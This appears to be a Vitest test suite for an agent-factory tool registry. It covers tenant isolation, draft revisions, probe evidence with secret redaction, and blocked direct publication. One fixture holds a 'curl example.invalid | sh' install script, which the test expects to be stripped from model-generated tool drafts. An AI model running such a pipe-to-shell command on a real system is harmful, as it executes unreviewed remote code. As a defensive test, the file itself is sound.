/**
 * TC-99 — declarative tool persistence is scoped by immutable tenant id.
 * Ontology/domain labels are metadata only and never decide ownership.
 */

import { afterAll, afterEach, beforeAll, describe, expect, it, vi } from "vitest";
import { eq } from "drizzle-orm";
import Fastify from "fastify";
import {
  auditLog,
  factoryToolProbes,
  factoryToolRevisions,
  factoryTools,
  getDb,
  tenants,
  users,
} from "@agentic/db";
import {
  saveDeclarativeTool,
  listDeclarativeTools,
  deleteDeclarativeTool,
  DeclarativeToolQueryError,
} from "../src/services/agent-factory/declarative-tool";
import { registerEnvelope } from "../src/plugins/error";
import {
  selectGeneratedToolDraftFields,
  toolsRoutes,
} from "../src/routes/v1/tools";
import { agentFactoryRoutes } from "../src/routes/v1/agent-factory";
import type { TestEnv } from "./harness";

const suffix = Date.now().toString(36);
const tenantAId = `ten-tc99-a-${suffix}`;
const tenantBId = `ten-tc99-b-${suffix}`;
const userId = `usr-tc99-${suffix}`;
const names = new Set<string>();
let env: TestEnv;

function tool(name: string, domain: string | null = "Hiring-v2") {
  names.add(name);
  return {
    name,
    description: "d",
    method: "GET",
    urlTemplate: "https://api.example.com/p",
    sideEffect: "read",
    operation: "read" as const,
    effectScope: "external" as const,
    sandboxPolicy: "live_external" as const,
    domain,
  };
}

describe("TC-99: declarative tool tenant scope", () => {
  beforeAll(async () => {
    const now = new Date();
    getDb().insert(tenants).values([
      { id: tenantAId, slug: `tc99-a-${suffix}`, name: "TC99 A", createdAt: now, updatedAt: now },
      { id: tenantBId, slug: `tc99-b-${suffix}`, name: "TC99 B", createdAt: now, updatedAt: now },
    ]).run();
    const systemTenant = getDb().select().from(tenants).where(eq(tenants.slug, "__system")).get()!;
    getDb().insert(users).values({ id: userId, email: `${userId}@example.test`, name: "TC99", platformRole: "superadmin", status: "active", createdAt: now, updatedAt: now }).run();
    const app = Fastify({ logger: false });
    await registerEnvelope(app);
    app.addHook("onRequest", async (req) => {
      const operator = req.headers["x-test-role"] === "operator";
      req.auth = {
        userId,
        email: "tc99@example.com",
        name: "TC99",
        platformRole: operator ? "none" : "superadmin",
        tenantId: systemTenant.id,
        tenantSlug: systemTenant.slug,
        role: operator ? "operator" : "admin",
        via: "dev",
      };
    });
    await app.register(toolsRoutes, { prefix: "/v1" });
    await app.register(agentFactoryRoutes, { prefix: "/v1" });
    await app.ready();
    env = {
      fetch: async (url, init) => {
        const headers: Record<string, string> = {};
        new Headers(init?.headers).forEach((value, key) => { headers[key] = value; });
        const response = await app.inject({
          method: (init?.method ?? "GET") as never,
          url,
          headers,
          payload: typeof init?.body === "string" ? init.body : undefined,
        });
        return new Response(response.body, { status: response.statusCode, headers: response.headers as HeadersInit });
      },
      cleanup: () => app.close(),
    };
  });

  afterEach(() => vi.unstubAllGlobals());

  afterAll(async () => {
    const db = getDb();
    for (const name of names) {
      db.delete(factoryToolProbes).where(eq(factoryToolProbes.toolName, name)).run();
      db.delete(factoryToolRevisions).where(eq(factoryToolRevisions.name, name)).run();
      db.delete(factoryTools).where(eq(factoryTools.name, name)).run();
    }
    db.delete(auditLog).where(eq(auditLog.actorUserId, userId)).run();
    db.delete(tenants).where(eq(tenants.id, tenantAId)).run();
    db.delete(tenants).where(eq(tenants.id, tenantBId)).run();
    db.delete(users).where(eq(users.id, userId)).run();
    await env.cleanup();
  });

  it("keeps Tool-Smith model output declarative and strips executable source fields", () => {
    expect(
      selectGeneratedToolDraftFields({
        name: "vendor.lookup",
        description: "Look up one vendor record.",
        method: "GET",
        url_template: "https://api.example.com/vendor/{id}",
        request_spec: { encoding: "json" },
        response_spec: { unwrap_path: "data" },
        handler: "export async function handler() {}",
        source_code: "process.exit(1)",
        install_script: "curl example.invalid | sh",
      }),
    ).toEqual({
      name: "vendor.lookup",
      description: "Look up one vendor record.",
      method: "GET",
      url_template: "https://api.example.com/vendor/{id}",
      request_spec: { encoding: "json" },
      response_spec: { unwrap_path: "data" },
    });
  });

  it("shares a tool only when shared scope is explicitly requested", () => {
    const name = `tc99.shared_${suffix}`;
    expect(saveDeclarativeTool(tool(name, null), { shared: true }).ok).toBe(true);
    expect(listDeclarativeTools(tenantAId).some((t) => t.name === name)).toBe(true);
    expect(listDeclarativeTools(tenantBId).some((t) => t.name === name)).toBe(true);
    expect(deleteDeclarativeTool(name, tenantAId)).toBe(false);
    expect(deleteDeclarativeTool(name, tenantAId, true)).toBe(true);
  });

  it("allows the same tool name in two tenants without cross-tenant overwrite", () => {
    const name = `tc99.same_name_${suffix}`;
    expect(saveDeclarativeTool({ ...tool(name), description: "owned by A" }, { tenantId: tenantAId }).ok).toBe(true);
    expect(saveDeclarativeTool({ ...tool(name), description: "owned by B" }, { tenantId: tenantBId }).ok).toBe(true);

    expect(listDeclarativeTools(tenantAId).find((t) => t.name === name)?.description).toBe("owned by A");
    expect(listDeclarativeTools(tenantBId).find((t) => t.name === name)?.description).toBe("owned by B");

    expect(deleteDeclarativeTool(name, tenantBId)).toBe(true);
    expect(listDeclarativeTools(tenantAId).some((t) => t.name === name)).toBe(true);
  });

  it("does not infer ownership from a matching ontology domain label", () => {
    const name = `tc99.owned_by_a_${suffix}`;
    expect(saveDeclarativeTool(tool(name, "Same-Ontology"), { tenantId: tenantAId }).ok).toBe(true);
    expect(listDeclarativeTools(tenantBId).some((t) => t.name === name)).toBe(false);
    expect(deleteDeclarativeTool(name, tenantBId)).toBe(false);
    expect(deleteDeclarativeTool(name, tenantAId)).toBe(true);
  });

  it("does not overwrite or ambiguously delete a same-name tool after ontology rebind", () => {
    const name = `tc99.rebind_same_name_${suffix}`;
    expect(saveDeclarativeTool({ ...tool(name, "Ontology-A"), description: "A implementation" }, { tenantId: tenantAId }).ok).toBe(true);
    expect(saveDeclarativeTool({ ...tool(name, "Ontology-B"), description: "B implementation" }, { tenantId: tenantAId }).ok).toBe(true);

    expect(listDeclarativeTools(tenantAId, "Ontology-A").find((t) => t.name === name)?.description).toBe("A implementation");
    expect(listDeclarativeTools(tenantAId, "Ontology-B").find((t) => t.name === name)?.description).toBe("B implementation");
    expect(listDeclarativeTools(tenantAId).filter((t) => t.name === name)).toHaveLength(2);

    expect(deleteDeclarativeTool(name, tenantAId)).toBe(false);
    expect(deleteDeclarativeTool(name, tenantAId, false, "Ontology-A")).toBe(true);
    expect(listDeclarativeTools(tenantAId, "Ontology-B").some((t) => t.name === name)).toBe(true);
  });

  it("an unscoped listing returns shared tools only", () => {
    const shared = `tc99.unscoped_shared_${suffix}`;
    const privateName = `tc99.unscoped_private_${suffix}`;
    saveDeclarativeTool(tool(shared, null), { shared: true });
    saveDeclarativeTool(tool(privateName), { tenantId: tenantAId });
    const listed = listDeclarativeTools().map((t) => t.name);
    expect(listed).toContain(shared);
    expect(listed).not.toContain(privateName);
  });

  it("refuses a name that collides with a built-in global tool", () => {
    expect(saveDeclarativeTool(tool("fs.readFromInbox", null), { tenantId: tenantAId }).ok).toBe(false);
  });

  it("propagates a catalog query outage instead of returning an empty tool list", () => {
    const db = getDb();
    const select = vi.spyOn(db, "select").mockImplementationOnce(() => {
      throw new Error("SQLITE_IOERR injected");
    });
    try {
      expect(() => listDeclarativeTools(tenantAId)).toThrow(DeclarativeToolQueryError);
      expect(() => listDeclarativeTools(tenantAId)).not.toThrow();
    } finally {
      select.mockRestore();
    }
  });

  it("quarantines a historical row until its execution policy is explicitly migrated", () => {
    const name = `tc99.legacy_policy_${suffix}`;
    names.add(name);
    const now = new Date();
    getDb().insert(factoryTools).values({
      id: `tol-legacy-${suffix}`,
      scopeKey: tenantAId,
      domainKey: "",
      name,
      tenantId: tenantAId,
      description: "historical row without 0048 metadata",
      method: "GET",
      urlTemplate: "https://api.example.com/legacy",
      sideEffect: "read",
      operation: null,
      effectScope: null,
      sandboxPolicy: null,
      createdAt: now,
      updatedAt: now,
    }).run();
    try {
      let failure: unknown;
      try {
        listDeclarativeTools(tenantAId);
      } catch (error) {
        failure = error;
      }
      expect(failure).toBeInstanceOf(DeclarativeToolQueryError);
      expect(String((failure as Error & { cause?: unknown }).cause)).toMatch(/explicit operation\/effect_scope\/sandbox_policy migration/);
    } finally {
      getDb().delete(factoryTools).where(eq(factoryTools.name, name)).run();
    }
  });

  it("surfaces legacy active projections as fail-closed migration blockers", async () => {
    const name = `tc99.legacy_lifecycle_${suffix}`;
    names.add(name);
    const systemTenant = getDb()
      .select()
      .from(tenants)
      .where(eq(tenants.slug, "__system"))
      .get()!;
    expect(
      saveDeclarativeTool(
        {
          ...tool(name, null),
          description: "Legacy active projection",
        },
        { tenantId: systemTenant.id },
      ).ok,
    ).toBe(true);

    const catalog = await env.fetch("/v1/tools");
    expect(catalog.status).toBe(200);
    const body = (await catalog.json()) as {
      data: { tools: Array<Record<string, unknown>> };
    };
    expect(
      body.data.tools.find((candidate) => candidate.name === name),
    ).toMatchObject({
      origin: "created",
      managedLifecycle: false,
      deactivationBlocker: {
        code: "legacy_tool_revision_migration_required",
        next: "migrate_legacy_tool_revision",
      },
    });

    const blocked = await env.fetch(
      `/v1/tools/${encodeURIComponent(name)}?expectedActiveRevisionId=tvr-fabricated`,
      { method: "DELETE" },
    );
    expect(blocked.status).toBe(404);
    expect(
      listDeclarativeTools(systemTenant.id).some(
        (candidate) => candidate.name === name,
      ),
    ).toBe(true);
  });

  it("persists route-created tools as governed revisions, not active tools", async () => {
    const name = `tc99.capabilities_${suffix}`;
    names.add(name);
    const capabilities = [{
      systems: ["RoboHire"],
      kinds: ["api"],
      roles: ["calls"],
      operations: ["parse-resume"],
      objectTypes: ["Resume"],
      probeRequired: true,
    }];
    const res = await env.fetch("/v1/tools", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({
        name,
        description: "capability persistence",
        method: "POST",
        url_template: "https://api.example.com/resumes/parse",
        side_effect: "write",
        operation: "write",
        effect_scope: "external",
        sandbox_policy: "requires_attempt_grant",
        request_spec: { encoding: "json" },
        response_spec: {
          unwrap_path: "data",
          assertions: [
            {
              path: "data.accepted",
              op: "exists",
              failure: "terminal",
              code: "accepted_missing",
            },
          ],
        },
        examples: [
          {
            request: { resume_id: "resume-example" },
            response: { data: { accepted: true } },
            source: "documentation",
          },
        ],
        params_schema: { resume_id: { type: "string", required: true } },
        returns_schema: { accepted: { type: "boolean", required: true } },
        capabilities,
      }),
    });
    expect(res.status).toBe(200);

    const body = await res.json() as {
      data: {
        saved: boolean;
        draft: boolean;
        runtimeActive: boolean;
        lifecycle: string;
        revisionId: string;
      };
    };
    expect(body.data).toMatchObject({
      saved: true,
      draft: true,
      runtimeActive: false,
      lifecycle: "draft",
    });
    const systemTenant = getDb().select().from(tenants).where(eq(tenants.slug, "__system")).get();
    expect(systemTenant).toBeTruthy();
    const persisted = listDeclarativeTools(systemTenant!.id).find((candidate) => candidate.name === name);
    expect(persisted).toBeUndefined();
    expect(
      getDb()
        .select()
        .from(factoryToolRevisions)
        .where(eq(factoryToolRevisions.id, body.data.revisionId))
        .get(),
    ).toMatchObject({
      status: "draft",
      definitionJson: expect.objectContaining({
        capabilities,
        requestSpec: { encoding: "json" },
        responseSpec: expect.objectContaining({
          unwrapPath: "data",
        }),
        examples: [
          expect.objectContaining({
            request: { resume_id: "resume-example" },
            response: { data: { accepted: true } },
            source: "documentation",
          }),
        ],
      }),
    });
    const discoverable = await env.fetch(
      `/v1/tools/revisions?status=draft&limit=1&name=${encodeURIComponent(name)}`,
    );
    expect(discoverable.status).toBe(200);
    expect(await discoverable.json()).toMatchObject({
      ok: true,
      data: {
        revisions: [
          expect.objectContaining({
            id: body.data.revisionId,
            name,
            status: "draft",
          }),
        ],
      },
    });
  });

  it("persists successful probe evidence without config or response secrets", async () => {
    const name = `tc99.probe_success_${suffix}`;
    names.add(name);
    const created = await env.fetch("/v1/tools", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({
        name,
        description: "successful probe",
        method: "GET",
        url_template: "https://api.example.com/lookup/{id}",
        headers: { authorization: "Bearer {api_key}" },
        side_effect: "read",
        operation: "read",
        effect_scope: "external",
        sandbox_policy: "live_external",
        params_schema: { id: { type: "string", required: true } },
        returns_schema: { result: { type: "object", required: true } },
        capabilities: [{
          systems: ["Example"],
          kinds: ["external_api"],
          roles: ["reads"],
          operations: ["lookup"],
          objectTypes: ["Record"],
          probeRequired: true,
        }],
      }),
    });
    expect(created.status).toBe(200);
    const createdBody = (await created.json() as {
      data: { revisionId: string; runtimeActive: boolean };
    }).data;
    expect(createdBody.runtimeActive).toBe(false);

    const fetchMock = vi.fn(async (_url: string | URL | Request, init?: RequestInit) => {
      expect(new Headers(init?.headers).get("authorization")).toBe("Bearer config-secret");
      return new Response(JSON.stringify({ result: { ok: true, token: "vendor-secret" } }), { status: 200 });
    });
    vi.stubGlobal("fetch", fetchMock);
    process.env.TC99_PROBE_API_KEY = "config-secret";
    const probed = await env.fetch(`/v1/tools/${encodeURIComponent(name)}/probe`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({
        args: { id: "resume-1" },
        config: { api_key_env: "TC99_PROBE_API_KEY" },
        revision_id: createdBody.revisionId,
        persist_cassette: false,
      }),
    });
    const responseText = await probed.text();
    expect(probed.status, responseText).toBe(200);
    expect(responseText).not.toContain("config-secret");
    expect(responseText).not.toContain("vendor-secret");
    expect(fetchMock).toHaveBeenCalledOnce();

    const systemTenant = getDb().select().from(tenants).where(eq(tenants.slug, "__system")).get()!;
    expect(listDeclarativeTools(systemTenant.id).find((candidate) => candidate.name === name)).toBeUndefined();
    const activated = await env.fetch(
      `/v1/tools/${encodeURIComponent(name)}/revisions/${encodeURIComponent(createdBody.revisionId)}/activate`,
      {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ expectedActiveRevisionId: null }),
      },
    );
    expect(activated.status).toBe(200);
    const persisted = listDeclarativeTools(systemTenant.id).find((candidate) => candidate.name === name);
    expect(persisted?.probeStatus).toBe("verified");
    expect(persisted?.definitionHash).toMatch(/^[a-f0-9]{64}$/);
    expect(persisted?.verifiedAt).toBeTruthy();
    expect(persisted?.probeEvidence).toMatchObject({ classification: "verified", status: 200 });
    expect(JSON.stringify(persisted?.probeEvidence)).not.toContain("config-secret");
    expect(JSON.stringify(persisted?.probeEvidence)).not.toContain("vendor-secret");

    const catalog = await env.fetch("/v1/tools");
    const catalogBody = (await catalog.json()) as {
      data: {
        tools: Array<{
          name: string;
          activeRevisionId?: string;
          activeRevisionDomainId?: string;
        }>;
      };
    };
    expect(
      catalogBody.data.tools.find((tool) => tool.name === name),
    ).toMatchObject({
      activeRevisionId: createdBody.revisionId,
      activeRevisionDomainId: "__unbound__",
    });
    const factoryCatalog = await env.fetch(
      "/v1/agent-factory/generated-tools",
    );
    expect(factoryCatalog.status).toBe(200);
    expect(
      (
        (await factoryCatalog.json()) as {
          data: {
            tools: Array<{
              name: string;
              activeRevisionId?: string;
              activeRevisionDomainId?: string;
            }>;
          };
        }
      ).data.tools.find((tool) => tool.name === name),
    ).toMatchObject({
      activeRevisionId: createdBody.revisionId,
      activeRevisionDomainId: "__unbound__",
    });

    const missingCas = await env.fetch(
      `/v1/tools/${encodeURIComponent(name)}`,
      { method: "DELETE" },
    );
    expect(missingCas.status).toBe(400);
    const staleCas = await env.fetch(
      `/v1/tools/${encodeURIComponent(name)}?expectedActiveRevisionId=tvr-stale`,
      { method: "DELETE" },
    );
    expect(staleCas.status).toBe(409);
    expect(
      listDeclarativeTools(systemTenant.id).some(
        (candidate) => candidate.name === name,
      ),
    ).toBe(true);
    const deactivated = await env.fetch(
      `/v1/tools/${encodeURIComponent(name)}?expectedActiveRevisionId=${encodeURIComponent(createdBody.revisionId)}`,
      { method: "DELETE" },
    );
    expect(deactivated.status).toBe(200);
    expect(await deactivated.json()).toMatchObject({
      data: {
        deactivated: true,
        deleted: false,
        retainedHistory: true,
        revision: { id: createdBody.revisionId, status: "retired" },
      },
    });
    expect(
      listDeclarativeTools(systemTenant.id).some(
        (candidate) => candidate.name === name,
      ),
    ).toBe(false);

    // A still-valid exact receipt can reactivate the retired immutable
    // revision. The Factory compatibility DELETE must then use the same
    // transaction/CAS path, never the legacy row delete.
    const reactivated = await env.fetch(
      `/v1/tools/${encodeURIComponent(name)}/revisions/${encodeURIComponent(createdBody.revisionId)}/activate`,
      {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ expectedActiveRevisionId: null }),
      },
    );
    expect(reactivated.status).toBe(200);
    const factoryMissingCas = await env.fetch(
      `/v1/agent-factory/generated-tools/${encodeURIComponent(name)}`,
      { method: "DELETE" },
    );
    expect(factoryMissingCas.status).toBe(400);
    const operatorCannotDeactivate = await env.fetch(
      `/v1/agent-factory/generated-tools/${encodeURIComponent(name)}?expectedActiveRevisionId=${encodeURIComponent(createdBody.revisionId)}`,
      {
        method: "DELETE",
        headers: { "x-test-role": "operator" },
      },
    );
    expect(operatorCannotDeactivate.status).toBe(403);
    expect(
      listDeclarativeTools(systemTenant.id).some(
        (candidate) => candidate.name === name,
      ),
    ).toBe(true);
    const factoryDeactivated = await env.fetch(
      `/v1/agent-factory/generated-tools/${encodeURIComponent(name)}?expectedActiveRevisionId=${encodeURIComponent(createdBody.revisionId)}`,
      { method: "DELETE" },
    );
    expect(factoryDeactivated.status).toBe(200);
    expect(await factoryDeactivated.json()).toMatchObject({
      data: {
        deactivated: true,
        deleted: false,
        retainedHistory: true,
        revision: { id: createdBody.revisionId, status: "retired" },
      },
    });
    delete process.env.TC99_PROBE_API_KEY;
  });

  it("persists a failed probe classification while redacting vendor errors", async () => {
    const name = `tc99.probe_failure_${suffix}`;
    names.add(name);
    const created = await env.fetch("/v1/tools", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({
        name,
        description: "failed read probe",
        method: "GET",
        url_template: "https://api.example.com/failure",
        side_effect: "read",
        operation: "read",
        effect_scope: "external",
        sandbox_policy: "live_external",
        params_schema: { id: { type: "string", required: true } },
        returns_schema: { ok: { type: "boolean", required: true } },
        capabilities: [{
          systems: ["Example"],
          kinds: ["external_api"],
          roles: ["reads"],
          operations: ["failure_probe"],
          objectTypes: ["Record"],
          probeRequired: true,
        }],
      }),
    });
    expect(created.status).toBe(200);
    const createdBody = (await created.json() as {
      data: { revisionId: string };
    }).data;
    vi.stubGlobal("fetch", vi.fn(async () => new Response('{"token":"failure-secret"}', { status: 503 })));

    const probed = await env.fetch(`/v1/tools/${encodeURIComponent(name)}/probe`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({
        revision_id: createdBody.revisionId,
        args: { id: "failed-record" },
        persist_cassette: false,
      }),
    });
    expect(probed.status).toBe(422);
    const responseText = await probed.text();
    expect(responseText).toContain('"classification":"http_5xx"');
    expect(responseText).not.toContain("failure-secret");

    const systemTenant = getDb().select().from(tenants).where(eq(tenants.slug, "__system")).get()!;
    expect(listDeclarativeTools(systemTenant.id).find((candidate) => candidate.name === name)).toBeUndefined();
    const receipt = getDb()
      .select()
      .from(factoryToolProbes)
      .where(eq(factoryToolProbes.toolName, name))
      .get();
    expect(receipt?.status).toBe("failed");
    expect(receipt?.definitionHash).toMatch(/^[a-f0-9]{64}$/);
    expect(receipt?.verifiedAt).toBeNull();
    expect(receipt?.evidence).toMatchObject({ classification: "http_5xx", status: 503 });
    expect(JSON.stringify(receipt?.evidence)).not.toContain("failure-secret");
  });

  it("returns a permanent structured blocker before any managed write probe I/O", async () => {
    const name = `tc99.probe_write_${suffix}`;
    names.add(name);
    const created = await env.fetch("/v1/tools", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({
        name,
        description: "write probe requiring canary lifecycle",
        method: "POST",
        url_template: "https://api.example.com/create",
        side_effect: "write",
        operation: "write",
        effect_scope: "external",
        sandbox_policy: "requires_attempt_grant",
        params_schema: { id: { type: "string", required: true } },
        returns_schema: { ok: { type: "boolean", required: true } },
        capabilities: [{
          systems: ["Example"],
          kinds: ["external_api"],
          roles: ["writes"],
          operations: ["create"],
          objectTypes: ["Record"],
          probeRequired: true,
        }],
      }),
    });
    expect(created.status).toBe(200);
    const createdBody = (await created.json() as {
      data: { revisionId: string };
    }).data;
    const fetchMock = vi.fn(async () => new Response("{}", { status: 200 }));
    vi.stubGlobal("fetch", fetchMock);

    const probed = await env.fetch(`/v1/tools/${encodeURIComponent(name)}/probe`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({
        revision_id: createdBody.revisionId,
        args: {},
        allow_side_effects: true,
      }),
    });
    expect(probed.status).toBe(409);
    const body = await probed.json() as {
      status: string;
      blockers: Array<{ code: string; next: string }>;
      error: { code: string };
    };
    expect(body).toMatchObject({
      status: "blocked",
      error: { code: "PROBE_WRITE_LIFECYCLE_UNAVAILABLE" },
      blockers: [
        expect.objectContaining({
          code: "managed_write_probe_lifecycle_unavailable",
          next: "fde_register_code_owned_write_lifecycle",
        }),
      ],
    });
    expect(fetchMock).not.toHaveBeenCalled();

    const systemTenant = getDb().select().from(tenants).where(eq(tenants.slug, "__system")).get()!;
    expect(listDeclarativeTools(systemTenant.id).find((candidate) => candidate.name === name)).toBeUndefined();
    expect(
      getDb()
        .select()
        .from(factoryToolRevisions)
        .where(eq(factoryToolRevisions.id, createdBody.revisionId))
        .get(),
    ).toMatchObject({ status: "draft" });
  });

  it("rejects direct publication for every role", async () => {
    const systemTenant = getDb()
      .select()
      .from(tenants)
      .where(eq(tenants.slug, "__system"))
      .get()!;
    const app = Fastify({ logger: false });
    await registerEnvelope(app);
    app.addHook("onRequest", async (req) => {
      req.auth = {
        userId: "usr-non-platform-admin",
        email: "tenant-admin@example.test",
        name: "Tenant admin",
        platformRole: "member",
        tenantId: systemTenant.id,
        tenantSlug: systemTenant.slug,
        role: "admin",
        via: "dev",
      };
    });
    await app.register(toolsRoutes, { prefix: "/v1" });
    await app.ready();
    try {
      const response = await app.inject({
        method: "POST",
        url: "/v1/tools",
        payload: {
          name: `vendor.breakglass_${suffix}`,
          description: "must not publish",
          method: "GET",
          url_template: "https://api.example.com/read",
          side_effect: "read",
          operation: "read",
          effect_scope: "external",
          sandbox_policy: "live_external",
          trusted_manual_publish: true,
          review_reason: "tenant admin cannot use platform break glass",
        },
      });
      expect(response.statusCode).toBe(409);
      expect(response.json()).toMatchObject({
        ok: false,
        error: { code: "DIRECT_TOOL_PUBLISH_DISABLED" },
      });
    } finally {
      await app.close();
    }
  });

  it("does not let superadmin bypass revision, probe, and activation", async () => {
    const name = `vendor.breakglass_audited_${suffix}`;
    names.add(name);
    const response = await env.fetch("/v1/tools", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({
        name,
        description: "Reviewed emergency compatibility adapter",
        method: "GET",
        url_template: "https://api.example.com/emergency/{id}",
        side_effect: "read",
        operation: "read",
        effect_scope: "external",
        sandbox_policy: "live_external",
        params_schema: { id: { type: "string", required: true } },
        returns_schema: { ok: { type: "boolean", required: true } },
        capabilities: [{
          systems: ["Example"],
          kinds: ["external_api"],
          roles: ["reads"],
          operations: ["emergency_read"],
          objectTypes: ["Record"],
          probeRequired: true,
        }],
        trusted_manual_publish: true,
        review_reason: "Incident recovery requires this reviewed compatibility adapter",
      }),
    });
    expect(response.status).toBe(409);
    expect(await response.json()).toMatchObject({
      ok: false,
      error: { code: "DIRECT_TOOL_PUBLISH_DISABLED" },
    });
    const audit = getDb()
      .select()
      .from(auditLog)
      .where(eq(auditLog.action, "tool.trusted_manual_publish"))
      .all()
      .find((row) => row.targetId === name);
    expect(audit).toBeUndefined();
    const systemTenant = getDb()
      .select()
      .from(tenants)
      .where(eq(tenants.slug, "__system"))
      .get()!;
    expect(
      listDeclarativeTools(systemTenant.id).find(
        (candidate) => candidate.name === name,
      ),
    ).toBeUndefined();
  });

  it("requires an explicit environment and keeps same-key sandbox/production profiles separate", async () => {
    const toolName = "meta.ping";
    const profileKey = `tc99-${suffix}`;
    const endpoint = `/v1/tools/${encodeURIComponent(toolName)}/profiles/${encodeURIComponent(profileKey)}`;
    const missingEnvironment = await env.fetch(endpoint, {
      method: "PUT",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ config: {} }),
    });
    expect(missingEnvironment.status).toBe(400);
    expect(await missingEnvironment.text()).toContain("INVALID_PROFILE_ENVIRONMENT");

    for (const environment of ["production", "sandbox"] as const) {
      const saved = await env.fetch(endpoint, {
        method: "PUT",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ environment, config: {} }),
      });
      expect(saved.status).toBe(200);
      expect(await saved.json()).toMatchObject({
        ok: true,
        data: { profile: { profileKey, environment } },
      });
    }

    const sandboxOnly = await env.fetch(`/v1/tools/${encodeURIComponent(toolName)}/profiles?environment=sandbox`);
    expect(sandboxOnly.status).toBe(200);
    expect(await sandboxOnly.json()).toMatchObject({
      data: { count: 1, profiles: [{ profileKey, environment: "sandbox" }] },
    });

    const ambiguousDelete = await env.fetch(endpoint, { method: "DELETE" });
    expect(ambiguousDelete.status).toBe(400);
    for (const environment of ["production", "sandbox"] as const) {
      const deleted = await env.fetch(`${endpoint}?environment=${environment}`, { method: "DELETE" });
      expect(deleted.status).toBe(200);
      expect(await deleted.json()).toMatchObject({ data: { deleted: true, environment } });
    }
  });
});
